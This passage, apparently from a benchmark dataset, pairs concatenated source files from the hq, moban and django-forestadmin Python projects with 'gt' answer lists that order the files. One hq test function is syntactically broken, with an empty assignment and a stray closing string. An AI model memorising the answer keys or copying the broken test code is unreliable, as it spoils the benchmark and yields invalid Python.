isinstance(first_token, NodeTestToken)):\n                raise HquerySyntaxError('Unexpected token {0}'.format(first_token))\n            predicates = self.parse_location_path_predicates()\n            path = LocationPath(Axis.child, first_token.node_test, predicates)\n\n        while self.token_is(SlashToken, DoubleSlashToken):\n            verbose_print('Continuing path after {0}'.format(self.token))\n\n            if self.advance_if(DoubleSlashToken):\n                path.append_step(Axis.descendant_or_self, NodeTest('node'), [])\n            else:\n                self.advance(SlashToken)\n\n            axis, node_test = self.parse_location_path_node_test()\n            predicates = self.parse_location_path_predicates()\n            path.append_step(axis, node_test, predicates)\n\n        verbose_print('Finished parsing location path {0}'.format(path), outdent_before=True)\n        return path\n\n\n    def parse_location_path_node_test(self):\n        axis_token = self.advance_if(AxisToken)\n        if axis_token is None:\n            axis = Axis.child\n        else:\n            verbose_print('consumed {0}'.format(axis_token))\n            axis = axis_token.axis\n\n        node_test_token = self.advance(NameTestToken, NodeTestToken, ContextNodeToken, ParentNodeToken)\n        verbose_print('consumed {0}'.format(node_test_token))\n\n        is_abbreviated = False\n        if isinstance(node_test_token, ContextNodeToken):\n            is_abbreviated = True\n            axis = Axis.self\n        elif isinstance(node_test_token, ParentNodeToken):\n            is_abbreviated = True\n            axis = Axis.parent\n\n        if is_abbreviated:\n            if axis_token is not None:\n                raise HquerySyntaxError('Axis {0} cannot be combined with abbreviated {1}.'.format(axis_token,\n                                                                                                   node_test_token))\n            node_test = NodeTest('node')\n        else:\n            node_test = node_test_token.node_test\n\n        return (axis, node_test)\n\n\n    def parse_location_path_predicates(self, already_inside_brace=False):\n        expressions = []\n        while already_inside_brace or self.advance_if(OpenSquareBraceToken):\n            already_inside_brace = False\n            verbose_print('parsing predicate expression starting with {0}'.format(self.token))\n            expressions.append(self.expression())\n            self.advance(CloseSquareBraceToken)\n        return expressions\n\n\n    def expression(self, rbp=LBP.nothing):\n        t = self.token\n        verbose_print(u'parsing expression starting with {0} (RBP={1})'.format(t, rbp), indent_after=True)\n        try:\n\n            self.token = self.next_token()\n            left = t.nud()\n            while rbp < self.token.lbp:\n                t = self.token\n                verbose_print('continuing expression at {0} (LBP={1})'.format(t, self.token.lbp))\n                self.token = self.next_token()\n                left = t.led(left)\n            verbose_print('finished expression', outdent_before=True)\n            return left\n\n        except AttributeError as err:\n            attr = re.search(r\"has no attribute '(\\w+)'\", err.args[0]).group(1)\n            if attr == 'nud':\n                raise HquerySyntaxError('unexpected token {0} found at beginning of expression'.format(t))\n            elif attr == 'led':\n                raise HquerySyntaxError('unexpected token {0} encountered in expression'.format(t))\n            else:\n                raise\n\n\n    def _cannot_eat_else_same_as_then_because_else_needs_lower_lbp_so_then_expr_knows_when_to_stop(self):\n        else_token = self.advance(IfElseToken)\n        if else_token.value.lower() != 'else':\n            raise HquerySyntaxError('if/then/else expected \"else\" after \"then\" expression; got \"{0}\"'.format(\n                else_token.value\n            ))\n\n'hq/hq/hquery/computed_constructors/json_array.py'\n:import json\n\nfrom hq.hquery.evaluation_error import HqueryEvaluationError\nfrom hq.hquery.object_type import string_value, is_string, debug_dump_anything, is_hash, \\\n    is_boolean, is_number\nfrom hq.hquery.sequences import make_sequence\nfrom hq.hquery.syntax_error import HquerySyntaxError\nfrom hq.soup_util import is_tag_node, is_text_node\nfrom hq.verbosity import verbose_print\n\n\nclass JsonArray:\n\n    def __init__(self, contents):\n        if not isinstance(contents, list):\n            raise HqueryEvaluationError('Attempted to construct a JSON array based on a(n) {0} object'.format(\n                contents.__class__.__name__))\n        self.contents = contents\n\n\n    def __repr__(self):\n        return 'ARRAY {0}'.format(repr(self.contents))\n\n\n    def __str__(self):\n        return json.dumps(self.contents)\n\n\n\nclass ComputedJsonArrayConstructor:\n\n    def __init__(self):\n        self.contents = None\n\n\n    def set_contents(self, expression_fn):\n        if self.contents is not None:\n            raise HquerySyntaxError('computed JSON array constructor already has contents')\n        self.contents = expression_fn\n\n\n    def evaluate(self):\n        return JsonArray([self._make_array_item(item) for item in make_sequence(self.contents())])\n\n\n    def _make_array_item(self, value):\n        if is_tag_node(value):\n            self._gab(lambda: 'appending text contents of element \"{0}\" to array'.format(debug_dump_anything(value)))\n            return string_value(value)\n        elif is_text_node(value) or is_string(value):\n            value = string_value(value)\n            self._gab(lambda: u'appending text \"{0}\" to array'.format(debug_dump_anything(value)))\n            return value\n        elif is_boolean(value) or is_number(value):\n            self._gab(lambda: 'appending {0} to array'.format(debug_dump_anything(value)))\n            return value.value\n        elif is_hash(value):\n            self._gab(lambda: u'appending JSON {0} to array'.format(debug_dump_anything(value)))\n            return value.contents\n        else:\n            raise HqueryEvaluationError(\"Can't use {0} as contents in a computed JSON array constructor\".format(\n                debug_dump_anything(value)))\n\n\n    def _gab(self, message):\n        verbose_print('JSON array constructor {0}'.format(message))\n\n'hq/test/hquery/test_name_tests.py'\n:import os\nimport sys\n\nfrom hq.output import convert_results_to_output_text\nfrom hq.soup_util import make_soup\nfrom hq.hquery.hquery_processor import HqueryProcessor\n\nsys.path.insert(0, os.path.abspath('../..'))\n\nfrom ..common_test_util import expected_result\nfrom test.hquery.hquery_test_util import query_html_doc\n\n\ndef test_name_test_is_case_insensitive():\n    html_body =\n    actual = query_html_doc(html_body, '/html/body/SpAn')\n    assert actual == expected_result()\n\n\ndef test_name_test_at_root_ignores_all_but_root_element():\n    html = \"\"\"\n    <!DOCTYPE html>\n    <!-- html -->\n    <html id=\"root\">\n    </html>\n    <html id=\"root\">\n    </html>\"\"\")\n\n\ndef test_name_test_tolerates_hyphens_in_element_names():\n    html_body = \"<special-name></special-name>\"\n    assert query_html_doc(html_body, '//special-name') == expected_result()\n\n\ndef test_name_test_tolerates_hyphens_in_attribute_names():\n    html_body = \"<div special-name='special-value'></div>\"\n    assert query_html_doc(html_body, '//div/@special-name') == expected_result('special-name=\"special-value\"')\n",
        "gt": [
            "'hq/hq/hquery/computed_constructors/json_array.py'",
            "'hq/hq/hquery/hquery_processor.py'",
            "'hq/test/hquery/test_name_tests.py'"
        ]
    },
    {
        "files": [
            "'moban/moban/core/utils.py'",
            "'moban/moban/main.py'",
            "'moban/tests/core/test_engine.py'",
            "'moban/moban/plugins/jinja2/engine.py'",
            "'moban/tests/jinja2/__init__.py'"
        ],
        "content": "'moban/moban/core/utils.py'\n:import os\nimport re\nimport sys\nimport logging\n\nfrom lml.utils import do_import\n\nfrom moban import constants\nfrom moban.externals import file_system\n\nLOG = logging.getLogger(__name__)\n\n\ndef verify_the_existence_of_directories(dirs):\n    if not isinstance(dirs, list):\n        dirs = [dirs]\n\n    dirs = [\n        directory\n        for directory in dirs\n        if not (\n            constants.DEFAULT_CONFIGURATION_DIRNAME in directory\n            or constants.DEFAULT_TEMPLATE_DIRNAME in directory\n        )\n    ]\n    if file_system.exists(constants.DEFAULT_CONFIGURATION_DIRNAME):\n        dirs.append(constants.DEFAULT_CONFIGURATION_DIRNAME)\n\n    if file_system.exists(constants.DEFAULT_TEMPLATE_DIRNAME):\n        dirs.append(constants.DEFAULT_TEMPLATE_DIRNAME)\n    return dirs\n\n\ndef handle_plugin_dirs(plugin_dirs):\n    if plugin_dirs is None:\n        return\n    LOG.info(\"handling plugin dirs {}\".format(\",\".join(plugin_dirs)))\n    for plugin_dir in plugin_dirs:\n        plugin_path = os.path.normcase(\n            os.path.dirname(os.path.abspath(plugin_dir))\n        )\n        if plugin_path not in sys.path:\n            sys.path.append(plugin_path)\n        pysearchre = re.compile(\".py$\", re.IGNORECASE)\n        pluginfiles = filter(pysearchre.search, os.listdir(plugin_dir))\n        plugins = list(map(lambda fp: os.path.splitext(fp)[0], pluginfiles))\n        for plugin in plugins:\n            plugin_module = os.path.basename(plugin_dir) + \".\" + plugin\n            do_import(plugin_module)\n\n'moban/moban/main.py'\n:\nimport re\nimport sys\nimport logging\nimport argparse\nimport logging.config\nfrom io import StringIO\nfrom collections import defaultdict\n\nfrom ruamel.yaml import YAML\n\nfrom moban import constants, exceptions\nfrom moban.core import ENGINES, plugins, hashstore, mobanfile, data_loader\nfrom moban._version import __version__\nfrom moban.externals import reporter, file_system\nfrom moban.core.utils import handle_plugin_dirs\nfrom moban.program_options import OPTIONS\n\nLOG = logging.getLogger()\nLOG_LEVEL = [logging.ERROR, logging.WARNING, logging.INFO, logging.DEBUG]\n\n\ndef main():\n    parser = create_parser()\n    options = vars(parser.parse_args())\n    handle_verbose(options[constants.LABEL_VERBOSE])\n    load_engine_factory_and_engines()\n    hashstore.HASH_STORE.IGNORE_CACHE_FILE = options[constants.LABEL_FORCE]\n    options[constants.CLI_DICT] = handle_custom_variables(\n        options.pop(constants.LABEL_DEFINE)\n    )\n    handle_custom_extensions(options.pop(constants.LABEL_EXTENSION))\n    handle_plugin_dirs(options.pop(constants.LABEL_PLUGIN_DIRS))\n\n    OPTIONS.update(options)\n    moban_file = options[constants.LABEL_MOBANFILE]\n    if moban_file is None:\n        moban_file = find_default_moban_file()\n    if moban_file:\n        try:\n            count = handle_moban_file(moban_file, options)\n            moban_exit(options[constants.LABEL_EXIT_CODE], count)\n        except (\n            exceptions.DirectoryNotFound,\n            exceptions.NoThirdPartyEngine,\n            exceptions.MobanfileGrammarException,\n            exceptions.UnsupportedPyFS2Protocol,\n        ) as e:\n            LOG.exception(e)\n            reporter.report_error_message(str(e))\n            moban_exit(options[constants.LABEL_EXIT_CODE], constants.ERROR)\n    else:\n        try:\n            count = handle_command_line(options)\n            moban_exit(options[constants.LABEL_EXIT_CODE], count)\n        except (\n            exceptions.NoTemplate,\n            exceptions.UnsupportedPyFS2Protocol,\n        ) as e:\n            reporter.report_error_message(str(e))\n            moban_exit(options[constants.LABEL_EXIT_CODE], constants.ERROR)\n\n\ndef moban_exit(exit_code_toggle_flag, exit_code):\n    if exit_code_toggle_flag:\n        if exit_code:\n            sys.exit(exit_code)\n    else:\n        if exit_code == constants.ERROR:\n            sys.exit(1)\n\n\ndef create_parser():\n    parser = argparse.ArgumentParser(\n        prog=constants.PROGRAM_NAME, description=constants.PROGRAM_DESCRIPTION\n    )\n    parser.add_argument(\n        \"-c\", \"--%s\" % constants.LABEL_CONFIG, help=\"the data file\"\n    )\n    parser.add_argument(\n        \"-t\", \"--%s\" % constants.LABEL_TEMPLATE, help=\"the template file\"\n    )\n    parser.add_argument(\n        \"-o\", \"--%s\" % constants.LABEL_OUTPUT, help=\"the output file\"\n    )\n    parser.add_argument(\n        constants.POSITIONAL_LABEL_TEMPLATE,\n        metavar=\"template\",\n        type=str,\n        nargs=\"?\",\n        help=\"string templates\",\n    )\n    advanced = parser.add_argument_group(\n        \"Advanced options\", \"For better control\"\n    )\n    advanced.add_argument(\n        \"-td\",\n        f\"--{constants.LABEL_TMPL_DIRS}\",\n        nargs=\"*\",\n        help=\"add more directories for template file lookup\",\n    )\n    advanced.add_argument(\n        \"-cd\",\n        f\"--{constants.LABEL_CONFIG_DIR}\",\n        help=\"the directory for configuration file lookup\",\n    )\n    advanced.add_argument(\n        \"-pd\",\n        f\"--{constants.LABEL_PLUGIN_DIRS}\",\n        nargs=\"*\",\n        help=\"add more directories for plugin lookup\",\n    )\n    advanced.add_argument(\n        \"-m\", \"--%s\" % constants.LABEL_MOBANFILE, help=\"custom moban file\"\n    )\n    advanced.add_argument(\n        \"-g\", \"--%s\" % constants.LABEL_GROUP, help=\"a subset of targets\"\n    )\n    advanced.add_argument(\n        f\"--{constants.LABEL_TEMPLATE_TYPE.replace('_', '-')}\",\n        help=\"the template type, default is jinja2\",\n    )\n    advanced.add_argument(\n        \"-d\",\n        f\"--{constants.LABEL_DEFINE}\",\n        nargs=\"+\",\n        help=(\n            \"to supply additional or override predefined variables,\"\n            + \" format: VAR=VALUEs\"\n        ),\n    )\n    advanced.add_argument(\n        \"-e\",\n        f\"--{constants.LABEL_EXTENSION}\",\n        nargs=\"+\",\n        help=\"to to TEMPLATE_TYPE=EXTENSION_NAME\",\n    )\n    advanced.add_argument(\n        \"-f\",\n        action=\"store_true\",\n        dest=constants.LABEL_FORCE,\n        default=False,\n        help=\"force moban to template all files despite of .moban.hashes\",\n    )\n    developer = parser.add_argument_group(\n        \"Developer options\", \"For debugging and development\"\n    )\n    developer.add_argument(\n        f\"--{constants.LABEL_EXIT_CODE}\",\n        action=\"store_true\",\n        dest=constants.LABEL_EXIT_CODE,\n        default=False,\n        help=(\n            \"by default, exist code 0 means no error, 1 means error occured. \"\n            + \"It tells moban to change 1 for changes, 2 for error occured\"\n        ),\n    )\n    developer.add_argument(\n        \"-V\",\n        f\"--{constants.LABEL_VERSION}\",\n        action=\"version\",\n        version=\"%(prog)s {v}\".format(v=__version__),\n    )\n    developer.add_argument(\n        \"-v\",\n        action=\"count\",\n        dest=constants.LABEL_VERBOSE,\n        default=0,\n        help=\"show verbose, try -v, -vv, -vvv\",\n    )\n    return parser\n\n\ndef handle_moban_file(moban_file, options):\n\n    moban_file_configurations = data_loader.load_data(None, moban_file)\n    yaml = YAML(typ=\"rt\")\n    dumped_yaml = StringIO()\n    yaml.dump(moban_file_configurations, dumped_yaml)\n    LOG.info(dumped_yaml.getvalue())\n    if moban_file_configurations is None:\n        raise exceptions.MobanfileGrammarException(\n            constants.ERROR_INVALID_MOBAN_FILE % moban_file\n        )\n    if (\n        constants.LABEL_TARGETS not in moban_file_configurations\n        and constants.LABEL_COPY not in moban_file_configurations\n    ):\n        raise exceptions.MobanfileGrammarException(\n            constants.ERROR_NO_TARGETS % moban_file\n        )\n    check_none(moban_file_configurations, moban_file)\n    version = moban_file_configurations.get(\n        constants.MOBAN_VERSION, constants.DEFAULT_MOBAN_VERSION\n    )\n    if version == constants.DEFAULT_MOBAN_VERSION:\n        mobanfile.handle_moban_file_v1(moban_file_configurations, options)\n    else:\n        raise exceptions.MobanfileGrammarException(\n            constants.MESSAGE_FILE_VERSION_NOT_SUPPORTED % version\n        )\n    hashstore.HASH_STORE.save_hashes()\n\n\ndef check_none(data, moban_file):\n\n    if isinstance(data, dict):\n        for k, v in data.items():\n            if check_none(v, moban_file) is None:\n                loc = data.lc.key(k)\n                raise exceptions.MobanfileGrammarException(\n                    constants.ERROR_MALFORMED_YAML\n                    % (moban_file, loc[0] + 1)\n                )\n    elif isinstance(data, list):\n        for i, x in enumerate(data):\n            if check_none(x, moban_file) is None:\n                loc = data.lc.item(i)\n                raise exceptions.MobanfileGrammarException(\n                    constants.ERROR_MALFORMED_YAML % (moban_file, loc[0] + 1)\n                )\n    return data\n\n\ndef handle_command_line(options):\n\n    reporter.GLOBAL[\"PRINT\"] = False\n    options = data_loader.merge(options, constants.DEFAULT_OPTIONS)\n    engine = ENGINES.get_engine(\n        options[constants.LABEL_TEMPLATE_TYPE],\n        options[constants.LABEL_TMPL_DIRS],\n        options[constants.LABEL_CONFIG_DIR],\n    )\n    if options[constants.LABEL_TEMPLATE] is None:\n        content = options[constants.POSITIONAL_LABEL_TEMPLATE]\n        if content is None:\n            if not sys.stdin.isatty() and sys.platform != \"win32\":\n                content = sys.stdin.read().strip()\n        if content is None:\n            raise exceptions.NoTemplate(constants.ERROR_NO_TEMPLATE)\n\n        engine.render_string_to_file(\n            content,\n            options[constants.LABEL_CONFIG],\n            options[constants.LABEL_OUTPUT],\n        )\n    else:\n        engine.render_to_file(\n            options[constants.LABEL_TEMPLATE],\n            options[constants.LABEL_CONFIG],\n            options[constants.LABEL_OUTPUT],\n        )\n    engine.report()\n    hashstore.HASH_STORE.save_hashes()\n    exit_code = reporter.convert_to_shell_exit_code(\n        engine.number_of_templated_files()\n    )\n    return exit_code\n\n\ndef find_default_moban_file():\n    for moban_file in constants.DEFAULT_MOBAN_FILES:\n        if file_system.exists(moban_file):\n            break\n    else:\n        moban_file = None\n    return moban_file\n\n\ndef load_engine_factory_and_engines():\n    plugins.make_sure_all_pkg_are_loaded()\n\n\ndef handle_custom_variables(list_of_definitions):\n    custom_data = {}\n    if list_of_definitions:\n        for definition in list_of_definitions:\n            key, value = definition.split(\"=\")\n            custom_data[key] = value\n\n    return custom_data\n\n\ndef handle_custom_extensions(list_of_definitions):\n    user_extensions = defaultdict(set)\n    if list_of_definitions:\n        for definition in list_of_definitions:\n            result = re.match(\"(.*?)=(.*)\", definition)\n            if result:\n                key, value = result.group(1), result.group(2)\n                user_extensions[key].add(value)\n\n    ENGINES.register_extensions(user_extensions)\n\n\ndef handle_verbose(verbose_level):\n    if verbose_level > len(LOG_LEVEL):\n        verbose_level = len(LOG_LEVEL) - 1\n    level = LOG_LEVEL[verbose_level]\n    logging.basicConfig(\n        format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\n        level=level,\n    )\n\n'moban/tests/core/test_engine.py'\n:import os\nfrom unittest.mock import patch\n\nimport fs.path\n\nfrom moban.core import ENGINES\nfrom moban.core.definitions import TemplateTarget\nfrom moban.plugins.yaml_loader import open_yaml\nfrom moban.plugins.jinja2.engine import Engine\n\nMODULE = \"moban.core.moban_factory\"\n\n\n@patch(MODULE + \".MobanEngine._render_with_finding_data_first\")\ndef test_do_templates_1(_do_templates_with_more_shared_data):\n    jobs = [\n        TemplateTarget(\"1.template\", \"data.yml\", \"1.output\"),\n        TemplateTarget(\"2.template\", \"data.yml\", \"2.output\"),\n        TemplateTarget(\"3.template\", \"data.yml\", \"3.output\"),\n        TemplateTarget(\"4.template\", \"data.yml\", \"4.output\"),\n        TemplateTarget(\"5.template\", \"data.yml\", \"6.output\"),\n    ]\n    expected = {\n        \"data.yml\": [\n            (\"1.template\", \"1.output\"),\n            (\"2.template\", \"2.output\"),\n            (\"3.template\", \"3.output\"),\n            (\"4.template\", \"4.output\"),\n            (\"5.template\", \"6.output\"),\n        ]\n    }\n    engine = ENGINES.get_engine(\"jinja2\", \".\", \".\")\n    engine.render_to_files(jobs)\n    _do_templates_with_more_shared_data.assert_called_with(expected)\n\n\n@patch(MODULE + \".MobanEngine._render_with_finding_template_first\")\ndef test_do_templates_2(_do_templates_with_more_shared_templates):\n    jobs = [\n        TemplateTarget(\"1.template\", \"data1.yml\", \"1.output\"),\n        TemplateTarget(\"1.template\", \"data2.yml\", \"2.output\"),\n        TemplateTarget(\"1.template\", \"data3.yml\", \"3.output\"),\n        TemplateTarget(\"1.template\", \"data4.yml\", \"4.output\"),\n        TemplateTarget(\"1.template\", \"data5.yml\", \"6.output\"),\n    ]\n    expected = {\n        \"1.template\": [\n            (\"data1.yml\", \"1.output\"),\n            (\"data2.yml\", \"2.output\"),\n            (\"data3.yml\", \"3.output\"),\n            (\"data4.yml\", \"4.output\"),\n            (\"data5.yml\", \"6.output\"),\n        ]\n    }\n    engine = ENGINES.get_engine(\"jinja2\", \".\", \".\")\n    engine.render_to_files(jobs)\n    _do_templates_with_more_shared_templates.assert_called_with(expected)\n\n\ndef test_do_templates_with_more_shared_templates():\n    base_dir = fs.path.join(\"tests\", \"fixtures\")\n    engine = ENGINES.get_engine(\n        \"jinja2\", base_dir, fs.path.join(base_dir, \"config\")\n    )\n    engine._render_with_finding_template_first(\n        {\"a.jj2\": [(fs.path.join(base_dir, \"child.yaml\"), \"test\")]}\n    )\n    with open(\"test\", \"r\") as f:\n        content = f.read()\n        assert content == \"hello world ox\"\n    os.unlink(\"test\")\n\n\ndef test_do_templates_with_more_shared_data():\n    base_dir = fs.path.join(\"tests\", \"fixtures\")\n    engine = ENGINES.get_engine(\n        \"jinja2\", base_dir, fs.path.join(base_dir, \"config\")\n    )\n    engine._render_with_finding_data_first(\n        {fs.path.join(base_dir, \"child.yaml\"): [(\"a.jj2\", \"test\")]}\n    )\n    with open(\"test\", \"r\") as f:\n        content = f.read()\n        assert content == \"hello world ox\"\n    os.unlink(\"test\")\n\n\ndef test_get_user_defined_engine():\n    test_fixture = fs.path.join(\n        \"tests\", \"fixtures\", \"mobanengine\", \"sample_template_type.yml\"\n    )\n    template_types = open_yaml(test_fixture)\n    ENGINES.register_options(template_types[\"template_types\"])\n    engine = ENGINES.get_engine(\"custom_jinja\", \".\", \".\")\n    assert engine.engine.__class__ == Engine\n\n\ndef test_custom_file_extension_is_assocated_with_user_defined_engine():\n    test_fixture = fs.path.join(\n        \"tests\", \"fixtures\", \"mobanengine\", \"sample_template_type.yml\"\n    )\n    template_types = open_yaml(test_fixture)\n    ENGINES.register_options(template_types[\"template_types\"])\n    template_type = ENGINES.get_primary_key(\"demo_file_suffix\")\n    assert \"custom_jinja\" == template_type\n\n\ndef test_built_in_jinja2_file_extension_still_works():\n    test_fixture = fs.path.join(\n        \"tests\", \"fixtures\", \"mobanengine\", \"sample_template_type.yml\"\n    )\n    template_types = open_yaml(test_fixture)\n    ENGINES.register_options(template_types[\"template_types\"])\n    template_type = ENGINES.get_primary_key(\"jj2\")\n    assert \"jinja2\" == template_type\n\n'moban/moban/plugins/jinja2/engine.py'\n:import re\nimport logging\nfrom typing import Dict\nfrom importlib import import_module\n\nimport fs.errors\nfrom jinja2 import Environment\nfrom lml.loader import scan_plugins_regex\nfrom lml.plugin import PluginInfo, PluginManager\nfrom jinja2_fsloader import FSLoader\nfrom jinja2.exceptions import TemplateNotFound, TemplateSyntaxError\n\nfrom moban import constants, exceptions\nfrom moban.externals import file_system\n\nJINJA2_LIBRARIES = \"^moban_jinja2_.+$\"\nJINJA2_EXTENSIONS = [\n    \"moban.plugins.jinja2.filters.repr\",\n    \"moban.plugins.jinja2.filters.text\",\n]\nJINJA2_THIRD_PARTY_EXTENSIONS = [\"jinja2.ext.do\", \"jinja2.ext.loopcontrols\"]\nLOG = logging.getLogger(__name__)\n\n\nclass PluginMixin:\n    def get_all(self):\n        for name in self.registry.keys():\n\n            the_filter = self.load_me_now(name)\n            yield (name, the_filter)\n\n\nclass JinjaFilterManager(PluginManager, PluginMixin):\n    def __init__(self):\n        super(JinjaFilterManager, self).__init__(\n            constants.JINJA_FILTER_EXTENSION\n        )\n\n\nclass JinjaTestManager(PluginManager, PluginMixin):\n    def __init__(self):\n        super(JinjaTestManager, self).__init__(constants.JINJA_TEST_EXTENSION)\n\n\nclass JinjaGlobalsManager(PluginManager, PluginMixin):\n    def __init__(self):\n        super(JinjaGlobalsManager, self).__init__(\n            constants.JINJA_GLOBALS_EXTENSION\n        )\n\n\nFILTERS = JinjaFilterManager()\nTESTS = JinjaTestManager()\nGLOBALS = JinjaGlobalsManager()\n\n\n@PluginInfo(\n    constants.TEMPLATE_ENGINE_EXTENSION, tags=[\"jinja2\", \"jinja\", \"jj2\", \"j2\"]\n)\nclass Engine(object):\n\n    ACTION_IN_PRESENT_CONTINUOUS_TENSE = \"Templating\"\n    ACTION_IN_PAST_TENSE = \"Templated\"\n\n    def __init__(self, template_fs, options: Dict = None):\n\n        LOG.debug(\"Jinja template engine started\")\n        load_jinja2_extensions()\n        template_loader = FSLoader(template_fs)\n        env_params = dict(\n            loader=template_loader,\n            keep_trailing_newline=True,\n            trim_blocks=True,\n            lstrip_blocks=True,\n            extensions=[\n                extension for extension in JINJA2_THIRD_PARTY_EXTENSIONS\n            ],\n        )\n        self.template_loader = template_loader\n\n        filters = tests = _globals = {}\n        if options:\n            if \"extensions\" in options:\n                raw_extensions = options.pop(\"extensions\")\n                (\n                    filters,\n                    tests,\n                    _globals,\n                    extensions,\n                ) = parse_extensioins(raw_extensions)\n                if is_extension_list_valid(extensions):\n\n                    env_params[\"extensions\"] += extensions\n                    import_module_of_extension(extensions)\n            env_params.update(options)\n        self.jj2_environment = Environment(**env_params)\n\n        for filter_name, filter_function in FILTERS.get_all():\n            self.jj2_environment.filters[filter_name] = filter_function\n\n        for test_name, test_function in TESTS.get_all():\n            self.jj2_environment.tests[test_name] = test_function\n\n        for global_name, dict_obj in GLOBALS.get_all():\n            self.jj2_environment.globals[global_name] = dict_obj\n\n\n        self.jj2_environment.filters.update(filters)\n        self.jj2_environment.tests.update(tests)\n        self.jj2_environment.globals.update(_globals)\n\n    def get_template(self, template_file):\n\n        try:\n            template = self.jj2_environment.get_template(template_file)\n            return template\n        except TemplateNotFound:\n            try:\n                content = file_system.read_unicode(template_file)\n                return self.jj2_environment.from_string(content)\n            except fs.errors.ResourceNotFound:\n                return self.jj2_environment.from_string(template_file)\n        except (UnicodeDecodeError, TemplateSyntaxError) as e:\n            LOG.error(e)\n            raise exceptions.PassOn(str(e))\n\n    def get_template_from_string(self, string):\n        return self.jj2_environment.from_string(string)\n\n    def apply_template(self, template, data, output):\n\n        template.globals[\"__target__\"] = output\n        template.globals[\"__template__\"] = template.name\n        rendered_content = template.render(**data)\n        rendered_content = strip_off_trailing_new_lines(rendered_content)\n        return rendered_content\n\n\ndef load_jinja2_extensions():\n    scan_plugins_regex(JINJA2_LIBRARIES, \"moban\", None, JINJA2_EXTENSIONS)\n\n\ndef is_extension_list_valid(extensions):\n    return (\n        extensions is not None\n        and isinstance(extensions, list)\n        and len(extensions) > 0\n    )\n\n\ndef import_module_of_extension(extensions):\n    modules = set()\n    if extensions:\n        for extension in extensions:\n            modules.add(extension.split(\".\")[0])\n    for module in modules:\n        import_module(module)\n\n\ndef strip_off_trailing_new_lines(content):\n    return re.sub(r\"(\\n\\s+)+$\", r\"\\n\", content)\n\n\ndef parse_extensioins(extensions):\n    from jinja2.utils import import_string\n\n    filters = {}\n    tests = {}\n    _globals = {}\n    jinja2_extensions = []\n\n    for extension in extensions:\n        if extension.startswith(\"test:\"):\n            test_function_string = extension.replace(\"test:\", \"\").strip()\n            test_function = import_string(test_function_string)\n            tests[test_function.__name__] = test_function\n        elif extension.startswith(\"filter:\"):\n            filter_function_string = extension.replace(\"filter:\", \"\").strip()\n            filter_function = import_string(filter_function_string)\n            filters[filter_function.__name__] = filter_function\n        elif extension.startswith(\"global:\"):\n            a_global = extension.replace(\"global:\", \"\").strip()\n            identifier, global_string = a_global.split(\"=\")\n            the_global = import_string(global_string)\n            _globals[identifier] = the_global\n        else:\n            jinja2_extensions.append(extension)\n\n    return filters, tests, _globals, jinja2_extensions\n\n'moban/tests/jinja2/__init__.py'\n:from moban.main import load_engine_factory_and_engines\n\n\ndef setUpModule():\n    load_engine_factory_and_engines()\n",
        "gt": [
            "'moban/moban/core/utils.py'",
            "'moban/moban/main.py'",
            "'moban/tests/jinja2/__init__.py'",
            "'moban/moban/plugins/jinja2/engine.py'",
            "'moban/tests/core/test_engine.py'"
        ]
    },
    {
        "files": [
            "'django-forestadmin/django_forest/resources/utils/queryset/search.py'",
            "'django-forestadmin/django_forest/tests/utils/test_schema.py'",
            "'django-forestadmin/django_forest/utils/views/base.py'",
            "'django-forestadmin/django_forest/resources/utils/queryset/__init__.py'",
            "'django-forestadmin/django_forest/tests/forest/question.py'",
            "'django-forestadmin/django_forest/tests/forest/__init__.py'"
        ],
        "content": "'django-forestadmin/django_forest/resources/utils/queryset/search.py'\n:import sys\nfrom distutils.util import strtobool\nfrom uuid import UUID\n\nfrom django.db.models import Q\n\nfrom django_forest.utils.collection import Collection\nfrom ..in_search_fields import in_search_fields\nfrom django_forest.utils.schema import Schema\n\n\nclass SearchMixin:\n    def get_fields_to_search(self, collection):\n        fields_to_search = []\n        for x in collection['fields']:\n            if x['type'] in ('String', 'Number', 'Enum') \\\n                    and not x['reference'] \\\n                    and not x['is_virtual'] \\\n                    and in_search_fields(x['field'], collection['search_fields']):\n                fields_to_search.append(x)\n        return fields_to_search\n\n    def is_number(self, search):\n        is_number = True\n        try:\n            search = int(search)\n        except ValueError:\n            try:\n                search = float(search)\n            except ValueError:\n                is_number = False\n\n        return search, is_number\n\n    def handle_number(self, search, lookup_field):\n        q_object = Q()\n\n        search, is_number = self.is_number(search)\n\n\n        if is_number:\n\n            if search <= sys.maxsize:\n                q_object = Q(**{lookup_field: search})\n            else:\n                q_object = Q(**{f'{lookup_field}__contains': search})\n\n        return q_object\n\n    def is_uuid(self, search):\n        try:\n            UUID(search)\n        except ValueError:\n            return False\n        else:\n            return True\n\n    def handle_string(self, search, lookup_field):\n        is_uuid = self.is_uuid(search)\n\n        if is_uuid:\n            q_object = Q(**{lookup_field: search})\n        else:\n            q_object = Q(**{f'{lookup_field}__icontains': search})\n\n        return q_object\n\n    def handle_enum(self, search, enums, lookup_field):\n        q_object = Q()\n\n\n        if search in enums:\n            q_object = Q(**{lookup_field: search})\n\n        return q_object\n\n    def get_lookup_field(self, field_name, related_field):\n        lookup_field = field_name\n        if related_field is not None:\n            lookup_field = f'{related_field}__{lookup_field}'\n        return lookup_field\n\n    def handle_field(self, search, field, related_field_name=None):\n        q_objects = Q()\n\n        lookup_field = self.get_lookup_field(field['field'], related_field_name)\n        if field['type'] == 'Enum':\n            q_objects |= self.handle_enum(search, field['enums'], lookup_field)\n        elif field['type'] == 'Number':\n            q_objects |= self.handle_number(search, lookup_field)\n        else:\n            q_objects |= self.handle_string(search, lookup_field)\n\n        return q_objects\n\n    def handle_search_extended(self, search, Model):\n        q_objects = Q()\n\n        related_fields = [x for x in Model._meta.get_fields() if x.is_relation and not x.many_to_many]\n        for related_field in related_fields:\n            q_objects |= self.fill_conditions(search, related_field.related_model._meta.db_table, related_field.name)\n\n        return q_objects\n\n    def add_smart_field(self, smart_field, resource, search):\n        q_object = Q()\n        method = smart_field['search']\n        if isinstance(method, str):\n            q_object = getattr(Collection._registry[resource], method)(search)\n        elif callable(method):\n            q_object = method(search)\n        return q_object\n\n    def add_smart_fields(self, collection, resource, search):\n        q_objects = Q()\n        smart_fields = [x for x in collection['fields'] if x['is_virtual']]\n        for smart_field in smart_fields:\n            if 'search' in smart_field:\n                q_objects |= self.add_smart_field(smart_field, resource, search)\n\n        return q_objects\n\n    def fill_conditions(self, search, resource, related_field_name=None):\n        q_objects = Q()\n\n        collection = Schema.get_collection(resource)\n        fields_to_search = self.get_fields_to_search(collection)\n        for field in fields_to_search:\n            q_objects |= self.handle_field(search, field, related_field_name)\n\n\n        q_objects |= self.add_smart_fields(collection, resource, 